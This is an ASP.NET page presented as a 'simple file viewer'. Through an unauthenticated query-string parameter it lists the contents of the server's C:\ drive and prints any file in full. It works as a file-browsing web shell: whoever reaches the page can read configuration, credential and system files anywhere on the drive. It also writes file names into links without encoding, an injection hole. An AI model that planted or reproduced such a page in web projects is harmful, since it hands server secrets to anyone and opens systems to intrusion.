<%@ Page Language="C#" %>
<!DOCTYPE html>
<html>
<head>
    <title>Simple file viewer</title>
</head>
<body>	
	<% 
	string selectedFile = Request.QueryString["dir"];
	string isFile = Request.QueryString["isFile"];
	string path = "C:\\";
	string filePath;
	

	if (string.IsNullOrEmpty(selectedFile))
	{
		filePath = path;
	}
	else
	{
		filePath = System.IO.Path.Combine(path, selectedFile);	
	}

	if (string.IsNullOrEmpty(isFile))
		{	
			%>
			<h1>Files</h1>
			<table style="border-spacing: 10px;">	
				<tr>
					<td>
						<%= System.IO.File.GetLastWriteTime(filePath)%>
					</td>
					
					<td>
					<i> D </i>
					</td>

					<td>
					.
					</td>
				</tr>
				<%
				string[] directories = System.IO.Directory.GetDirectories(filePath);
				foreach (string directory in directories)
				{
					%>
					<tr>
						<td>
						<%= System.IO.File.GetLastWriteTime(directory)%>
						</td>

						<td>
						<i> D </i>
						</td>

						<td>
						<a href="?dir=<%= selectedFile + System.IO.Path.GetFileName(directory) %>\" style="text-decoration: none;">
							<%= System.IO.Path.GetFileName(directory) %>
						</a>
						</td>
					</tr>
					<%
				}
				string[] files = System.IO.Directory.GetFiles(filePath);
				foreach (string file in files)
				{
					string fileName = System.IO.Path.GetFileName(file);
					%>
					<tr>
						<td>
						<%= System.IO.File.GetLastWriteTime(filePath + fileName)%>
						</td>

						<td>
						<i> - </i>
						</td>

						<td>
						<a href="?dir=<%= selectedFile + fileName %>&isFile=true" style="text-decoration: none;">
							<%=fileName %>
						</a>
						</td>
					</tr>
					<%
				}
				%>
				</table>
				<%
		}
		else
		{	
			%>
			<h1> <% =filePath %> </h1>
			<%
			string fileContent = System.IO.File.ReadAllText(filePath);
			string encodedContent = Server.HtmlEncode(fileContent).Replace("\n", "<br/>");
			%>
			<% =encodedContent %>
			<%
            	}
        %>
</body>
</html>
